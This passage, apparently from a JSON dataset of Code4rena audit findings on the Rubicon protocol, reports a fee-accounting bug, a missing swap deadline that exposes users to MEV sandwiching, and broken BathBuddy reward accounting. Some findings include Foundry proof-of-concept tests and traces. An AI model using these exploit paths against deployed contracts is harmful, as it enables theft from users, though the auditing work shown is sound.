buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], pay_amt: 1000000000000000000, buy_amt: 100000000)\n    â”‚   â”œâ”€ emit LogSortedOffer(id: 1)\n    â”‚   â””â”€ â† 1\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 999000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000001234)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [0] VM::expectRevert()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [167743] RubiconMarket::offer(1000000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])\n    â”‚   â”œâ”€ [32321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [25521] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 99990000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 99990000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [24995] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 999900000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 999900000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 999900000000000000, give_amt: 99990000)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 9999)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 1000000000000000000)\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 0)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 0)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3095] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 99990000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 99990000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 99990000000000, give_amt: 9999)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 0)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 100000000000000)\n    â”‚   â””â”€ â† \"EvmError: Revert\"\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â””â”€ â† ()\n\nTest result: ok. 1 passed; 0 failed; finished in 2.67ms\n```\n\nLet's take a look at this line, we find the actual ````take_amt```` is ````0.9999e18 RUBI```` rather than the expected ````1e18````, the difference is exact the 0.01% of fee.\n```solidity\nemit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001,\n pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148,\n taker: 0x0000000000000000000000000000000000001234,\n maker: 0x0000000000000000000000000000000000005678,\n pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b],\n buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a],\n take_amt: 999900000000000000,\ngive_amt: 99990000)\n```\n\nBack to source code, we can see the issue arises on L1313 of ````_matcho()````,  where ````m_pay_amt```` should be some thing like ````m_pay_amt + fee````.\n\n```solidity\nFile: contracts\\RubiconMarket.sol\n1273:     function _matcho(\n1274:         uint256 t_pay_amt, //taker sell how much\n1275:         ERC20 t_pay_gem, //taker sell which token\n1276:         uint256 t_buy_amt, //taker buy how much\n1277:         ERC20 t_buy_gem, //taker buy which token\n1278:         uint256 pos, //position id\n1279:         bool rounding, //match \"close enough\" orders?\n1280:         address owner,\n1281:         address recipient\n1282:     ) internal returns (uint256 id) {\n1283:         uint256 best_maker_id; //highest maker id\n1284:         uint256 t_buy_amt_old; //taker buy how much saved\n1285:         uint256 m_buy_amt; //maker offer wants to buy this much token\n1286:         uint256 m_pay_amt; //maker offer wants to sell this much token\n1287:\n1288:         // there is at least one offer stored for token pair\n1289:         while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n1290:             best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n1291:             m_buy_amt = offers[best_maker_id].buy_amt;\n1292:             m_pay_amt = offers[best_maker_id].pay_amt;\n1293:\n...\n1313:             buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n1314:             emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n1315:             t_buy_amt_old = t_buy_amt;\n1316:             t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n1317:             t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n1318:\n1319:             if (t_pay_amt == 0 || t_buy_amt == 0) {\n1320:                 break;\n1321:             }\n1322:         }\n1323:\n...\n1341:     }\n\n```\n\n## Tools Used\nManually review\n\n## Recommended Mitigation Steps\nSee PoC\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1257,
      "page_start": null,
      "heading": "1257. No deadline parameter in `sellAllAmount()` and `buyAllAmount()` functions:",
      "heading_cleaned": "No deadline parameter in `sellAllAmount()` and `buyAllAmount()` functions:",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1028-L1112\n\n\n# Vulnerability details\n\n## Impact\nThere is no deadline parameter in these two functions,This missing feature enables pending transactions to be maliciously executed at a later point.\n\n## Proof of Concept\nConsider following scnerio:\n\n1. Alice wants to create order of 1000DAI for 1 ETH . She signs the transaction with  minOutputAmount = 0.99 ETH to allow for some slippage.\n2.The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n3. When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it. In the meantime, the price of ETH could have drastically changed. She will still at least get 0.99 ETH due to minOutputAmount, but the DAI value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\n1. The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of  has gone up significantly since the transaction was signed (lets say its not dai now and some other token), meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her minOutputAmount value is outdated and would allow for significant slippage.\n2. A MEV bot detects the pending transaction. Since the outdated minOutputAmount now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd deadline param\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1028-L1112\n\n\n# Vulnerability details\n\n## Impact\nThere is no deadline parameter in these two functions,This missing feature enables pending transactions to be maliciously executed at a later point.\n\n## Proof of Concept\nConsider following scnerio:\n\n1. Alice wants to create order of 1000DAI for 1 ETH . She signs the transaction with  minOutputAmount = 0.99 ETH to allow for some slippage.\n2.The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n3. When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it. In the meantime, the price of ETH could have drastically changed. She will still at least get 0.99 ETH due to minOutputAmount, but the DAI value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\n1. The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of  has gone up significantly since the transaction was signed (lets say its not dai now and some other token), meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her minOutputAmount value is outdated and would allow for significant slippage.\n2. A MEV bot detects the pending transaction. Since the outdated minOutputAmount now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd deadline param",
      "description": null,
      "impact": "## Impact\nThere is no deadline parameter in these two functions,This missing feature enables pending transactions to be maliciously executed at a later point.\n",
      "mitigation": "## Recommended Mitigation Steps\nAdd deadline param\n",
      "poc": "## Proof of Concept\nConsider following scnerio:\n\n1. Alice wants to create order of 1000DAI for 1 ETH . She signs the transaction with  minOutputAmount = 0.99 ETH to allow for some slippage.\n2.The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n3. When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it. In the meantime, the price of ETH could have drastically changed. She will still at least get 0.99 ETH due to minOutputAmount, but the DAI value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\n1. The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of  has gone up significantly since the transaction was signed (lets say its not dai now and some other token), meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her minOutputAmount value is outdated and would allow for significant slippage.\n2. A MEV bot detects the pending transaction. Since the outdated minOutputAmount now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1028-L1112\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nThere is no deadline parameter in these two functions,This missing feature enables pending transactions to be maliciously executed at a later point.\n",
        "recommendation": "## Recommended Mitigation Steps\nAdd deadline param\n",
        "poc": "## Proof of Concept\nConsider following scnerio:\n\n1. Alice wants to create order of 1000DAI for 1 ETH . She signs the transaction with  minOutputAmount = 0.99 ETH to allow for some slippage.\n2.The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n3. When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it. In the meantime, the price of ETH could have drastically changed. She will still at least get 0.99 ETH due to minOutputAmount, but the DAI value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\n1. The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of  has gone up significantly since the transaction was signed (lets say its not dai now and some other token), meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her minOutputAmount value is outdated and would allow for significant slippage.\n2. A MEV bot detects the pending transaction. Since the outdated minOutputAmount now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1028-L1112\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1028-L1112\n\n\n# Vulnerability details\n\n## Impact\nThere is no deadline parameter in these two functions,This missing feature enables pending transactions to be maliciously executed at a later point.\n\n## Proof of Concept\nConsider following scnerio:\n\n1. Alice wants to create order of 1000DAI for 1 ETH . She signs the transaction with  minOutputAmount = 0.99 ETH to allow for some slippage.\n2.The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n3. When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it. In the meantime, the price of ETH could have drastically changed. She will still at least get 0.99 ETH due to minOutputAmount, but the DAI value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\n1. The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of  has gone up significantly since the transaction was signed (lets say its not dai now and some other token), meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her minOutputAmount value is outdated and would allow for significant slippage.\n2. A MEV bot detects the pending transaction. Since the outdated minOutputAmount now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd deadline param\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1279,
      "page_start": null,
      "heading": "1279. Reward accounting is incorrect in BathBuddy contract",
      "heading_cleaned": "Reward accounting is incorrect in BathBuddy contract",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n\n# Vulnerability details\n\n## Impact\n\nThe `BathBuddy` contracts implements rewards for liquidity providers (holders of `BathToken`). The contract is modeled after the famous Synthetix staking contract, with some tweaks to support rewards for multiple tokens at the same time.\n\nThe implementation overall is correct, however there is a critical difference with the Synthetix contract that is ignored in the `BathBuddy` contract. In the Synthetix implementation the main actions related to rewards accounting are the `stake` and `withdraw` actions, these trigger the `updateReward` modifier to ensure correct reward accounting. Staked tokens cannot be transferred, as these are held in the staking contract. In the BathBuddy implementation things are very different as there is no staking, rewards are intended to be distributed directly to holders of the BathToken without any need of staking the tokens in the contract. This means that, as there is no \"staking\" action in the BathBuddy implementation (i.e. depositing funds in the contract), rewards fail to be correctly accounted whenever BathToken are minted, burned or transferred between different accounts.\n\nThese are two critical places in the code where the BathBuddy contract uses the state from the BathToken, but fails to be triggered whenever the state in the BathToken is modified. The first is the `rewardPerToken` that calculates the amount of rewards that should correspond to one unit of the BathToken token, this is logically dependent on the total supply of the token (lines 124 and 133):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L121-L135\n\n```solidity\n121:     function rewardPerToken(address token) public view returns (uint256) {\n122:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n123:\n124:         if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n125:             return rewardsPerTokensStored[token];\n126:         }\n127:         return\n128:             rewardsPerTokensStored[token].add(\n129:                 lastTimeRewardApplicable(token)\n130:                     .sub(lastUpdateTime[token])\n131:                     .mul(rewardRates[token])\n132:                     .mul(1e18)\n133:                     .div(IERC20(myBathTokenBuddy).totalSupply())\n134:             );\n135:     }\n```\n\nThe other place is in the `earned` function which uses the BathToken `balanceOf` function of an account (lines 146-147):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L139-L161\n\n```solidity\n139:     function earned(\n140:         address account,\n141:         address token\n142:     ) public view override returns (uint256) {\n143:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n144:\n145:         return\n146:             IERC20(myBathTokenBuddy) // Care with this?\n147:                 .balanceOf(account)\n148:                 .mul(\n149:                     rewardPerToken(token).sub(\n150:                         userRewardsPerTokenPaid[token][account]\n151:                     )\n152:                 )\n153:                 .div(1e18)\n154:                 .add(tokenRewards[token][account]);\n155:     }\n156:\n157:     function getRewardForDuration(\n158:         address token\n159:     ) external view returns (uint256) {\n160:         return rewardRates[token].mul(rewardsDuration[token]);\n161:     }\n```\n\nSince the whole BathBuddy contract is dependent on the total supply and account balance state of the paired BathToken contract, the following actions in the token should update the rewards state in BathBuddy:\n\n- `mint` and `burn`, as these modify the total supply of the token and the balances of the account whose tokens are minted or burned.\n- `transfer` and `transferFrom`, as these modify the balances of the sender and recipient accounts.\n\nAs the BathBuddy `updateReward` modifier fails to be triggered when the mentioned state in the BathToken is modified, reward accounting will be incorrect for many different scenarios. We'll explore one of these in the next section.\n\n## Proof of Concept\n\nIn the following test we demonstrate one of the possible scenarios where reward accounting is broken, this is a simple case in which rewards fail to be updated when a token transfer is executed. Alice has 1e18 BathTokens, at the middle of the rewards duration period she sends all her tokens to Bob. The expected outcome should be that Alice would earn half of the rewards, as she held the tokens for the half of the duration period. But when the duration period has ended, we call `getReward` for both Alice and Bob and we can see that Alice got nothing and Bob earned 100% of the rewards.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_IncorrectRewardAccounting() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Alice transfers tokens for Bob at middle of the period\n    vm.prank(alice);\n    bathToken.transfer(bob, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Trigger getRewards for Bob\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, bob);\n\n    // Alice gets nothings and Bob gets the full rewards, even though Alice held the tokens for half the duration time\n    assertEq(rewardToken.balanceOf(alice), 0);\n    assertEq(rewardToken.balanceOf(bob), rewardAmount);\n}\n```\n\n## Recommendation\n\nThere are two recommended paths here. The easy path would be to just add the `stake` and `withdraw` functions to the BathBuddy contract similar to how the original StakingRewards contract works on Synthetix. However, this may change the original intention of the protocol as rewards won't be earned just by holding BathTokens, they will need to be staked (rewards will only be distributed to stakers).\n\nThe other path, and a bit more complex, would be to modify the BathToken contract (the cToken) so that burn, mint and transfer actions trigger the update on the paired BathBuddy contract.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n\n# Vulnerability details\n\n## Impact\n\nThe `BathBuddy` contracts implements rewards for liquidity providers (holders of `BathToken`). The contract is modeled after the famous Synthetix staking contract, with some tweaks to support rewards for multiple tokens at the same time.\n\nThe implementation overall is correct, however there is a critical difference with the Synthetix contract that is ignored in the `BathBuddy` contract. In the Synthetix implementation the main actions related to rewards accounting are the `stake` and `withdraw` actions, these trigger the `updateReward` modifier to ensure correct reward accounting. Staked tokens cannot be transferred, as these are held in the staking contract. In the BathBuddy implementation things are very different as there is no staking, rewards are intended to be distributed directly to holders of the BathToken without any need of staking the tokens in the contract. This means that, as there is no \"staking\" action in the BathBuddy implementation (i.e. depositing funds in the contract), rewards fail to be correctly accounted whenever BathToken are minted, burned or transferred between different accounts.\n\nThese are two critical places in the code where the BathBuddy contract uses the state from the BathToken, but fails to be triggered whenever the state in the BathToken is modified. The first is the `rewardPerToken` that calculates the amount of rewards that should correspond to one unit of the BathToken token, this is logically dependent on the total supply of the token (lines 124 and 133):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L121-L135\n\n```solidity\n121:     function rewardPerToken(address token) public view returns (uint256) {\n122:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n123: \n124:         if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n125:             return rewardsPerTokensStored[token];\n126:         }\n127:         return\n128:             rewardsPerTokensStored[token].add(\n129:                 lastTimeRewardApplicable(token)\n130:                     .sub(lastUpdateTime[token])\n131:                     .mul(rewardRates[token])\n132:                     .mul(1e18)\n133:                     .div(IERC20(myBathTokenBuddy).totalSupply())\n134:             );\n135:     }\n```\n\nThe other place is in the `earned` function which uses the BathToken `balanceOf` function of an account (lines 146-147):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L139-L161\n\n```solidity\n139:     function earned(\n140:         address account,\n141:         address token\n142:     ) public view override returns (uint256) {\n143:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n144: \n145:         return\n146:             IERC20(myBathTokenBuddy) // Care with this?\n147:                 .balanceOf(account)\n148:                 .mul(\n149:                     rewardPerToken(token).sub(\n150:                         userRewardsPerTokenPaid[token][account]\n151:                     )\n152:                 )\n153:                 .div(1e18)\n154:                 .add(tokenRewards[token][account]);\n155:     }\n156: \n157:     function getRewardForDuration(\n158:         address token\n159:     ) external view returns (uint256) {\n160:         return rewardRates[token].mul(rewardsDuration[token]);\n161:     }\n```\n\nSince the whole BathBuddy contract is dependent on the total supply and account balance state of the paired BathToken contract, the following actions in the token should update the rewards state in BathBuddy:\n\n- `mint` and `burn`, as these modify the total supply of the token and the balances of the account whose tokens are minted or burned.\n- `transfer` and `transferFrom`, as these modify the balances of the sender and recipient accounts.\n\nAs the BathBuddy `updateReward` modifier fails to be triggered when the mentioned state in the BathToken is modified, reward accounting will be incorrect for many different scenarios. We'll explore one of these in the next section.\n\n## Proof of Concept\n\nIn the following test we demonstrate one of the possible scenarios where reward accounting is broken, this is a simple case in which rewards fail to be updated when a token transfer is executed. Alice has 1e18 BathTokens, at the middle of the rewards duration period she sends all her tokens to Bob. The expected outcome should be that Alice would earn half of the rewards, as she held the tokens for the half of the duration period. But when the duration period has ended, we call `getReward` for both Alice and Bob and we can see that Alice got nothing and Bob earned 100% of the rewards.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_IncorrectRewardAccounting() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Alice transfers tokens for Bob at middle of the period\n    vm.prank(alice);\n    bathToken.transfer(bob, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Trigger getRewards for Bob\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, bob);\n\n    // Alice gets nothings and Bob gets the full rewards, even though Alice held the tokens for half the duration time\n    assertEq(rewardToken.balanceOf(alice), 0);\n    assertEq(rewardToken.balanceOf(bob), rewardAmount);\n}\n```\n\n## Recommendation\n\nThere are two recommended paths here. The easy path would be to just add the `stake` and `withdraw` functions to the BathBuddy contract similar to how the original StakingRewards contract works on Synthetix. However, this may change the original intention of the protocol as rewards won't be earned just by holding BathTokens, they will need to be staked (rewards will only be distributed to stakers).\n\nThe other path, and a bit more complex, would be to modify the BathToken contract (the cToken) so that burn, mint and transfer actions trigger the update on the paired BathBuddy contract.\n",
      "description": null,
      "impact": "## Impact\n\nThe `BathBuddy` contracts implements rewards for liquidity providers (holders of `BathToken`). The contract is modeled after the famous Synthetix staking contract, with some tweaks to support rewards for multiple tokens at the same time.\n\nThe implementation overall is correct, however there is a critical difference with the Synthetix contract that is ignored in the `BathBuddy` contract. In the Synthetix implementation the main actions related to rewards accounting are the `stake` and `withdraw` actions, these trigger the `updateReward` modifier to ensure correct reward accounting. Staked tokens cannot be transferred, as these are held in the staking contract. In the BathBuddy implementation things are very different as there is no staking, rewards are intended to be distributed directly to holders of the BathToken without any need of staking the tokens in the contract. This means that, as there is no \"staking\" action in the BathBuddy implementation (i.e. depositing funds in the contract), rewards fail to be correctly accounted whenever BathToken are minted, burned or transferred between different accounts.\n\nThese are two critical places in the code where the BathBuddy contract uses the state from the BathToken, but fails to be triggered whenever the state in the BathToken is modified. The first is the `rewardPerToken` that calculates the amount of rewards that should correspond to one unit of the BathToken token, this is logically dependent on the total supply of the token (lines 124 and 133):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L121-L135\n\n```solidity\n121:     function rewardPerToken(address token) public view returns (uint256) {\n122:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n123:\n124:         if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n125:             return rewardsPerTokensStored[token];\n126:         }\n127:         return\n128:             rewardsPerTokensStored[token].add(\n129:                 lastTimeRewardApplicable(token)\n130:                     .sub(lastUpdateTime[token])\n131:                     .mul(rewardRates[token])\n132:                     .mul(1e18)\n133:                     .div(IERC20(myBathTokenBuddy).totalSupply())\n134:             );\n135:     }\n```\n\nThe other place is in the `earned` function which uses the BathToken `balanceOf` function of an account (lines 146-147):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L139-L161\n\n```solidity\n139:     function earned(\n140:         address account,\n141:         address token\n142:     ) public view override returns (uint256) {\n143:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n144:\n145:         return\n146:             IERC20(myBathTokenBuddy) // Care with this?\n147:                 .balanceOf(account)\n148:                 .mul(\n149:                     rewardPerToken(token).sub(\n150:                         userRewardsPerTokenPaid[token][account]\n151:                     )\n152:                 )\n153:                 .div(1e18)\n154:                 .add(tokenRewards[token][account]);\n155:     }\n156:\n157:     function getRewardForDuration(\n158:         address token\n159:     ) external view returns (uint256) {\n160:         return rewardRates[token].mul(rewardsDuration[token]);\n161:     }\n```\n\nSince the whole BathBuddy contract is dependent on the total supply and account balance state of the paired BathToken contract, the following actions in the token should update the rewards state in BathBuddy:\n\n- `mint` and `burn`, as these modify the total supply of the token and the balances of the account whose tokens are minted or burned.\n- `transfer` and `transferFrom`, as these modify the balances of the sender and recipient accounts.\n\nAs the BathBuddy `updateReward` modifier fails to be triggered when the mentioned state in the BathToken is modified, reward accounting will be incorrect for many different scenarios. We'll explore one of these in the next section.\n",
